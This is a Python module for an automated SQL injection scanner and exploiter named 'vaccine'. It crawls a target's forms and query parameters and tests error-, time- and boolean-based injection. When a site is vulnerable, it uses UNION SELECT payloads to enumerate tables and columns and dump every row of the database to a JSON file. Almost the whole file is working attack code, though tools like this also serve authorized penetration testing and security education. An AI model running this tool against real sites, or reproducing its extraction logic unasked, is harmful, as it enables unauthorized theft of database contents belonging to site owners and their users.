"""SQL injection scanner: detects and exploits SQLi vulnerabilities."""
import re
import time
import json
from difflib import SequenceMatcher
from typing import Any
from urllib.parse import (
    ParseResult,
    urlparse,
    urlunparse,
    urljoin,
    parse_qs,
)

import requests
from requests import Response
from requests.exceptions import RequestException
from bs4 import BeautifulSoup, Tag

from vaccine.constants import BOLD, RED, GREEN, YELLOW, RESET
from vaccine.constants import HTTP_METHODS, USER_AGENT
from vaccine.constants import (
    ERROR_BASED,
    TIME_BASED,
    BOOLEAN_BASE,
    UNION_BASED,
    COLS_ERRORS,
    SYSTEM_DBS,
    START,
    END,
)


class SqliScanner:
    """Scan a URL for SQL injection vulnerabilities."""

    session = requests.Session()
    session.headers["User-Agent"] = USER_AGENT

    def __init__(
            self,
            url: str,
            method: str,
            output: str,
            cookies: str | None = None
    ) -> None:
        """
        Initialize the scanner.

        Args:
            url: Target URL to scan.
            method: HTTP method to use (GET or POST).
            output: Path to the JSON file where results are saved.
            cookies: Optional cookie string (e.g. "key=val; key2=val2").
        """
        self._set_session_cookies(cookies)
        self._url = self.validate_url(url.strip())
        self._has_query = self.has_query_params(self._url)
        self._method = self.validate_method(method.strip())
        self._output = output
        self._db = str()
        self._db_dump = dict()

    def _sql_injection(self) -> None:
        """Run the full SQL injection scan on the target URL."""
        parsed_url = urlparse(self._url)
        url = urlunparse(parsed_url[:4] + ("", "",))

        print(f"\n{GREEN}[*] Fetching forms on:{RESET} {url}")
        forms = self.get_forms(url)

        print(
            f"\n{GREEN}[*] Testing forms on:{RESET} {url}"
            f"\n{BOLD}Detected {len(forms)} form(s).{RESET}"
        )
        self._scan_forms(url, forms)

        if self._has_query:
            print(
                f"__\n\n{GREEN}[*] Testing query "
                f"parameters on:{RESET} {self._url}\n"
            )
            self._scan_query_params(url, parsed_url)

    def _scan_forms(self, url: str, forms: list[Tag]) -> None:
        """
        Test each HTML form for SQL injection.

        Args:
            url: Base URL where the forms were found.
            forms: List of BeautifulSoup form tags to test.
        """
        for form in forms:
            details = self.get_form_details(form)
            method = details["method"]
            form_url = urljoin(url, details["action"])
            endpoint = {
                "url": form_url,
                "method": method,
            }
            print(
                f"\n{BOLD}Form {forms.index(form)+1}: "
                f"{urlparse(form_url).path}{RESET}"
            )
            for c in ["'", '"']:
                if self._db:
                    break
                data = self.get_form_data(details, c)
                self._sqli_error_based(endpoint, data, c)

            if not self._db:
                return

            payload = TIME_BASED[self._db]
            data = self.get_form_data(details, payload)
            self._sqli_time_based(endpoint, data, payload)

            true_data = self.get_form_data(details, BOOLEAN_BASE[self._db][1])
            false_data = self.get_form_data(details, BOOLEAN_BASE[self._db][0])
            self._sqli_boolean_based(endpoint, true_data, false_data)

    def _scan_query_params(self, url: str, parsed_url: ParseResult) -> None:
        """
        Test URL query parameters for SQL injection.

        Args:
            url: Base URL without query string.
            parsed_url: Parsed URL object containing the query string.
        """
        query = parsed_url.query
        parsed_query = parse_qs(query)
        endpoint = {
            "url": url,
            "method": self._method,
        }
        base = {k: v[0] for k, v in parsed_query.items()}
        for param in parsed_query:
            for value in parsed_query[param]:
                for c in ["'", '"']:
                    if self._db:
                        break
                    data = {**base, param: value + c}
                    self._sqli_error_based(endpoint, data, c)

                if not self._db:
                    continue

                payload = TIME_BASED[self._db]
                data = {**base, param: value + payload}
                self._sqli_time_based(endpoint, data, payload)

                true_data = {**base, param: value + BOOLEAN_BASE[self._db][1]}
                false_data = {**base, param: value + BOOLEAN_BASE[self._db][0]}
                self._sqli_boolean_based(endpoint, true_data, false_data)

    def _sqli_error_based(
            self,
            endpoint: dict[str, str],
            data: dict[str, str],
            payload: str,
    ) -> None:
        """
        Test for error-based SQL injection.

        Sends a request with a malformed payload and checks if the
        response contains a database error message.

        Args:
            endpoint: Dict with 'url' and 'method' keys.
            data: Request parameters with the payload already injected.
            payload: The injection string that was used (for logging).
        """
        response = self._get_response(endpoint, data)
        content = response.text.lower()
        if self._is_error_vulnerable(content):
            if response.request.url == endpoint["url"]:
                request = response.request.body
            else:
                request = response.request.url
            record = {
                "type": "error-based",
                "url": endpoint["url"],
                "vulnerable parameters": list(data.keys()),
                "payload": payload,
                "method": response.request.method,
                "request": request,
                "db": self._db,
            }
            self._archive(record)
            print(
                f"{YELLOW}[ERROR-BASED] - [{payload}] : "
                "SQL injection vulnerability detected, "
                f"logs in: {self._output}{RESET}"
            )
            if self._db_dump:
                return
            print(f"{GREEN}[*] Dumping database...{RESET}")
            clean_data = {
                key: value.strip("'\"")
                for key, value in data.items()
            }
            self._sqli_union_based(endpoint, clean_data)
        else:
            print(
                f"[ERROR-BASED] - [{payload}] : "
                "No vulnerability detected."
            )

    def _sqli_boolean_based(
            self,
            endpoint: dict[str, str],
            true_data: dict[str, str],
            false_data: dict[str, str]
    ) -> None:
        """
        Test for boolean-based SQL injection.

        Sends two requests with a true and a false condition and
        compares the responses. A significant difference indicates
        a vulnerability.

        Args:
            endpoint: Dict with 'url' and 'method' keys.
            true_data: Parameters containing a always-true condition.
            false_data: Parameters containing an always-false condition.
        """
        true_response = self._get_response(endpoint, true_data)
        false_response = self._get_response(endpoint, false_data)

        ratio = SequenceMatcher(
            None,
            true_response.content,
            false_response.content
        ).ratio()

        if ratio < 0.99:
            if true_response.request.url == endpoint["url"]:
                request = [
                    false_response.request.body,
                    true_response.request.body,
                ]
            else:
                request = [
                    false_response.request.url,
                    true_response.request.url,
                ]
            record = {
                "type": "boolean-based",
                "url": endpoint["url"],
                "vulnerable parameters": list(true_data.keys()),
                "payload": BOOLEAN_BASE[self._db],
                "method": true_response.request.method,
                "request": request,
            }
            self._archive(record)
            print(
                f"{YELLOW}[BOOLEAN-BASED] - {BOOLEAN_BASE[self._db]} "
                f"SQL injection vulnerability detected, "
                f"logs in: {self._output}{RESET}"
            )

    def _sqli_time_based(
            self,
            endpoint: dict[str, str],
            data: dict[str, str],
            payload: str
    ) -> None:
        """
        Test for time-based blind SQL injection.

        Compares the response time of a normal request against one
        with a sleep payload. A delay of at least 1 second over the
        baseline is considered a positive result.

        Args:
            endpoint: Dict with 'url' and 'method' keys.
            data: Request parameters with the sleep payload injected.
            payload: The sleep payload used (for logging).
        """
        baseline_data = {
            k: v.replace(payload, '')
            for k, v in data.items()
        }
        baseline_start = time.time()
        response = self._get_response(endpoint, baseline_data, timeout=8)
        baseline_delay = time.time() - baseline_start

        start = time.time()
        response = self._get_response(endpoint, data, timeout=8)
        delay = time.time() - start

        if delay >= baseline_delay+1:
            if response.request.url == endpoint["url"]:
                request = response.request.body
            else:
                request = response.request.url
            record = {
                "type": "time-based",
                "url": endpoint["url"],
                "vulnerable parameters": list(data.keys()),
                "payload": payload,
                "method": response.request.method,
                "request": request,
            }
            self._archive(record)
            print(
                f"{YELLOW}[TIME-BASED] - [{payload}] : SQL injection "
                "vulnerability detected, "
                f"logs in: {self._output}{RESET}"
            )

    def _sqli_union_based(
        self,
        endpoint: dict[str, str],
        data: dict[str, str],
    ) -> None:
        """
        Perform union-based extraction to dump the database.

        Determines the column count, finds an injectable column,
        then fetches table names, column names and all row data.

        Args:
            endpoint: Dict with 'url' and 'method' keys.
            data: Clean request parameters (without injection chars).
        """
        union_ctx = dict()
        union_ctx["endpoint"] = endpoint
        union_ctx["data"] = data
        if self._set_column_count(union_ctx):
            if self._find_injectable_column(union_ctx):
                self._fetch_tables(union_ctx)
                self._fetch_columns(union_ctx)
                self._dump_database(union_ctx)
                record = {
                    "type": "union-based (dump)",
                    "url": endpoint["url"],
                    "vulnerable parameters": list(data.keys()),
                    "method": endpoint["method"].upper(),
                    "data": self._db_dump,
                }
                self._archive(record)
                print(
                    f"{GREEN}[✔] Database dump complete.\n"
                    f"Results saved to: {self._output}{RESET}")

    def _set_column_count(self, union_ctx: dict[str, Any]) -> int:
        """
        Find the number of columns in the vulnerable query.

        Tries UNION SELECT with increasing NULL counts until no
        column mismatch error is returned.

        Args:
            union_ctx: Shared dict holding endpoint, data, and results.

        Returns:
            1 if the column count was found, 0 otherwise.
        """
        for key, value in union_ctx["data"].items():
            for n in range(1, 19):
                cols = ["NULL"] * n
                payload = (
                    f"{UNION_BASED[self._db]["select"]}"
                    f"{','.join(cols)} -- -")
                data = dict(union_ctx["data"])
                data[key] = f"{value}{payload}"
                response = self._get_response(union_ctx["endpoint"], data)
                content = response.text.lower()

                if COLS_ERRORS[self._db] not in content:
                    union_ctx["key"] = key
                    union_ctx["cols"] = cols
                    return 1
        return 0

    def _find_injectable_column(self, union_ctx: dict[str, Any]) -> int:
        """
        Find a column whose value is reflected in the response.

        Replaces each column one by one with the marker string
        'vaccine' and checks if it appears in the page output.

        Args:
            union_ctx: Shared dict holding endpoint, data, and results.

        Returns:
            1 if a reflected column was found, 0 otherwise.
        """
        cols_len = len(union_ctx["cols"])
        filler = "0" if self._db == "sqlite" else "NULL"
        for i in range(cols_len):
            cols = [filler] * cols_len
            cols[i] = "'vaccine'"
            payload = (
                f"{UNION_BASED[self._db]["select"]}"
                f"{','.join(cols)} -- -")
            data = dict(union_ctx["data"])
            data[union_ctx["key"]] = f"1{payload}"
            response = self._get_response(union_ctx["endpoint"], data)
            content = response.text.lower()

            if response.status_code == 200 and "vaccine" in content:
                union_ctx["cols"] = cols
                union_ctx["injec_col"] = i
                return 1
        return 0

    def _fetch_tables(self, union_ctx: dict[str, Any]) -> None:
        """
        Retrieve table names from the database via UNION injection.

        Populates union_ctx['tables'] and initialises self._db_dump
        with the discovered database and table names.

        Args:
            union_ctx: Shared dict holding endpoint, data, and results.
        """
        cols = union_ctx["cols"]
        injec_col = union_ctx["injec_col"]
        key = union_ctx["key"]
        cols[injec_col] = UNION_BASED[self._db]["tables"]["expr"]
        cols[injec_col] = cols[injec_col].format(start=START, end=END)
        clause = UNION_BASED[self._db]["tables"]["from"]
        if self._db == "mysql":
            clause = clause.format(system_dbs=str(SYSTEM_DBS)[1:-1])
        payload = (
            f"{UNION_BASED[self._db]["select"]}"
            f"{','.join(cols)} "
            f"FROM {clause} -- -"
        )
        data = dict(union_ctx["data"])
        data[key] = f"1{payload}"
        response = self._get_response(union_ctx["endpoint"], data)
        content = response.text
        tables = re.findall(f"{START}(.*?){END}", content)
        tables = [t for t in tables if re.match(r'^[a-zA-Z0-9_.]+$', t)]

        union_ctx["tables"] = list()
        for table in tables:
            if self._db == "mysql":
                db, tb = table.split('.', 1)
            elif self._db == "sqlite":
                db, tb = "main", table
            union_ctx["tables"].append(tb)
            self._db_dump.setdefault(db, {})[tb] = []

    def _fetch_columns(self, union_ctx: dict[str, Any]) -> None:
        """
        Retrieve column names for each discovered table.

        Updates self._db_dump by adding column names under each table.

        Args:
            union_ctx: Shared dict holding endpoint, data, and results.
        """
        cols = union_ctx["cols"]
        injec_col = union_ctx["injec_col"]
        key = union_ctx["key"]

        cols[injec_col] = UNION_BASED[self._db]["columns"]["expr"]
        cols[injec_col] = cols[injec_col].format(start=START, end=END)
        clause = UNION_BASED[self._db]["columns"]["from"]

        if self._db == "mysql":
            table_clauses = [
                (clause.format(db=db, table=tb), (db, tb))
                for db, tables in self._db_dump.items()
                for tb in tables
            ]
        elif self._db == "sqlite":
            table_clauses = [
                (clause.format(table=tb), tb)
                for tb in union_ctx["tables"]
            ]

        for clause, tb in table_clauses:
            payload = (
                f"{UNION_BASED[self._db]["select"]}"
                f"{','.join(cols)} "
                f"FROM {clause} -- -"
            )
            data = dict(union_ctx["data"])
            data[key] = f"1{payload}"
            response = self._get_response(union_ctx["endpoint"], data)
            content = response.text

            columns = re.findall(f"{START}(.*?){END}", content)
            columns = [c for c in columns if re.match(r'^[a-zA-Z0-9_]+$', c)]
            for column in columns:
                if self._db == "mysql":
                    db, tb_name = tb
                    self._db_dump[db][tb_name].append(column)
                elif self._db == "sqlite":
                    self._db_dump["main"][tb].append(column)

    def _dump_database(self, union_ctx: dict[str, Any]) -> None:
        """
        Dump all rows from every discovered table.

        Updates self._db_dump with the full row data for each table,
        using markers to extract values from the HTTP response.

        Args:
            union_ctx: Shared dict holding endpoint, data, and results.
        """
        cols = union_ctx["cols"]
        injec_col = union_ctx["injec_col"]
        key = union_ctx["key"]
        for db, tables_dict in self._db_dump.items():
            for tb, cl in tables_dict.items():
                cols[injec_col] = UNION_BASED[self._db]["dump"]["expr"]
                clauses = UNION_BASED[self._db]["dump"]["from"]

                if self._db == "mysql":
                    cols[injec_col] = cols[injec_col].format(
                        start=START,
                        columns=",'|',".join(
                            f"COALESCE({c},'')" for c in cl
                        ),
                        end=END,
                    )
                    line_count = self._get_line_count(union_ctx, db, tb)
                    clauses = [
                        clauses.format(db=db, table=tb, offset=n)
                        for n in range(line_count)
                    ]
                elif self._db == "sqlite":
                    cols[injec_col] = cols[injec_col].format(
                        start=START,
                        columns="||'|'||".join(
                            f"COALESCE({c},'')" for c in cl
                        ),
                        end=END,
                    )
                    clauses = [clauses.format(table=tb)]

                rows = list()
                for clause in clauses:
                    payload = (
                        f"{UNION_BASED[self._db]["select"]}"
                        f"{','.join(cols)} "
                        f"FROM {clause} -- -"
                    )
                    data = dict(union_ctx["data"])
                    data[key] = f"1{payload}"
                    response = self._get_response(union_ctx["endpoint"], data)
                    content = response.text
                    matches = re.findall(f"{START}(.*?){END}", content)
                    if self._db == "mysql":
                        matches = [r for r in matches if "'" not in r]
                    rows.extend(matches)

                parsed_rows = [
                    dict(zip(cl, row.split('|')))
                    for row in rows
                ]
                self._db_dump[db][tb] = {"columns": cl, "rows": parsed_rows}

    def _get_line_count(
            self,
            union_ctx: dict[str, Any],
            db: str,
            tb: str
    ) -> int:
        """
        Get the number of rows in a MySQL table via COUNT(*).

        Args:
            union_ctx: Shared dict holding endpoint, data, and results.
            db: Database name.
            tb: Table name.

        Returns:
            Number of rows in the table, or 0 if not found.
        """
        cols = list(union_ctx["cols"])
        injec_col = union_ctx["injec_col"]
        key = union_ctx["key"]
        cols[injec_col] = f"CONCAT('{START}',COUNT(*),'{END}')"
        count_payload = (
            f"{UNION_BASED[self._db]["select"]}"
            f"{','.join(cols)} "
            f"FROM {db}.{tb} -- -"
        )
        data = dict(union_ctx["data"])
        data[key] = f"1{count_payload}"
        response = self._get_response(union_ctx["endpoint"], data)
        content = response.text.lower()
        matches = re.findall(f"{START}(.*?){END}", content)
        digits = [m for m in matches if m.isdigit()]
        if digits:
            return int(digits[0])
        return 0

    def _is_error_vulnerable(self, content: str) -> bool:
        """
        Check if a response contains a known database error message.

        Also sets self._db to the detected database engine.

        Args:
            content: Lowercased HTTP response body to inspect.

        Returns:
            True if a database error was found, False otherwise.
        """
        for db, errors in ERROR_BASED.items():
            for error in errors:
                if error in content:
                    self._db = db
                    return True
        return False

    def _is_same_netloc(self, link: str) -> bool:
        """
        Check if a link belongs to the same host as the target URL.

        Args:
            link: URL to compare against the target.

        Returns:
            True if both URLs share the same network location.
        """
        if urlparse(link).netloc == urlparse(self._url).netloc:
            return True
        return False

    def _archive(self, details: dict[str, Any]) -> None:
        """
        Append a result record to the JSON output file.

        Creates the file if it does not exist yet.

        Args:
            details: Dict containing the vulnerability details to save.
        """
        try:
            with open(self._output, "r") as file:
                data = json.load(file)
        except (OSError, json.JSONDecodeError):
            data = []
        data.append(details)
        with open(self._output, "w") as file:
            json.dump(data, file, indent=2)

    def _set_session_cookies(self, cookies: str | None = None) -> None:
        """
        Parse a cookie string and add each cookie to the session.

        Args:
            cookies: Cookie string formatted as "key=val; key2=val2".
                     Ignored if None.
        """
        if cookies:
            for pair in cookies.split(";"):
                if "=" in pair:
                    k, v = pair.strip().split("=", 1)
                    self.session.cookies.set(k.strip(), v.strip())

    @staticmethod
    def get_forms(url: str) -> list[Tag]:
        """
        Fetch a page and return all its HTML form tags.

        Args:
            url: URL of the page to parse.

        Returns:
            List of BeautifulSoup Tag objects for each <form>.
        """
        try:
            res = SqliScanner.session.get(url, timeout=10).content
        except RequestException as e:
            print(
                f"{RED}[ERROR] {type(e).__name__}: "
                f"request failed for: {url}{RESET}")
            raise
        soup = BeautifulSoup(res, "html.parser")
        return soup.find_all("form")

    @staticmethod
    def get_form_details(form: Tag) -> dict[str, Any]:
        """
        Extract useful attributes from an HTML form tag.

        Args:
            form: BeautifulSoup Tag representing a <form> element.

        Returns:
            Dict with keys 'action', 'method', and 'inputs'.
        """
        details = dict()
        action = form.attrs.get("action", "")
        method = form.attrs.get("method", "get").lower()
        inputs = list()
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            input_value = input_tag.attrs.get("value", "")
            inputs.append({
                "type": input_type,
                "name": input_name,
                "value": input_value,
            })
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        return details

    @staticmethod
    def get_form_data(details: dict[str, Any], payload: str) -> dict[str, str]:
        """
        Build a request data dict from form details with a payload.

        The payload is appended to every non-submit input value.

        Args:
            details: Form details as returned by get_form_details().
            payload: SQL injection string to inject into inputs.

        Returns:
            Dict mapping input names to their values with the payload.
        """
        data = dict()
        for input_tag in details["inputs"]:
            name = input_tag["name"]
            if name is None:
                continue
            if input_tag["type"] == "submit":
                data[name] = input_tag["value"]
            elif input_tag["type"] == "hidden" or input_tag["value"]:
                data[name] = input_tag["value"] + payload
            else:
                data[name] = f"1{payload}"
        return data

    @staticmethod
    def _get_response(
            endpoint: dict[str, str],
            data: dict[str, str],
            timeout: int = 20,
    ) -> Response:
        """
        Send an HTTP request and return the response.

        Args:
            endpoint: Dict with 'url' (str) and 'method' (str) keys.
            data: Parameters sent as query string (GET) or body (POST).
            timeout: Request timeout in seconds (default: 20).

        Returns:
            The HTTP Response object, or an empty Response on error.
        """
        method = endpoint["method"]
        url = endpoint["url"]
        response = Response()
        try:
            if method == "get":
                response = SqliScanner.session.get(
                    url,
                    params=data,
                    timeout=timeout,
                )
            elif method == "post":
                response = SqliScanner.session.post(
                    url,
                    data=data,
                    timeout=timeout,
                )
        except requests.exceptions.RequestException as e:
            print(f"{type(e).__name__}: {e}")

        return response

    @staticmethod
    def has_query_params(url: str) -> bool:
        """
        Check if a URL contains a query string.

        Args:
            url: URL to inspect.

        Returns:
            True if the URL has query parameters, False otherwise.
        """
        if urlparse(url).query:
            return True
        return False

    @staticmethod
    def validate_url(url: str) -> str:
        """
        Validate and normalise a URL.

        Args:
            url: URL string to validate.

        Returns:
            The normalised URL string.

        Raises:
            ValueError: If the URL is missing a scheme or host,
                        or uses a scheme other than http/https.
        """
        parsed = urlparse(url)
        has_value = all([parsed.scheme, parsed.netloc])

        if not has_value:
            raise ValueError(
                f"{url}: invalid URL, missing attribute(s)."
            )
        if parsed.scheme not in ["http", "https"]:
            raise ValueError(
                f"{url}: invalid scheme, "
                "expected 'http' or 'https'."
            )

        unparsed = urlunparse(parsed)
        return unparsed

    @staticmethod
    def validate_method(method: str) -> str:
        """
        Validate the HTTP method.

        Args:
            method: HTTP method string to validate (case-insensitive).

        Returns:
            The method in lowercase.

        Raises:
            ValueError: If the method is not GET or POST.
        """
        if method not in HTTP_METHODS:
            raise ValueError(
                f"{method}: invalid HTTP method, "
                "expected 'GET' or 'POST'."
            )
        return method.lower()
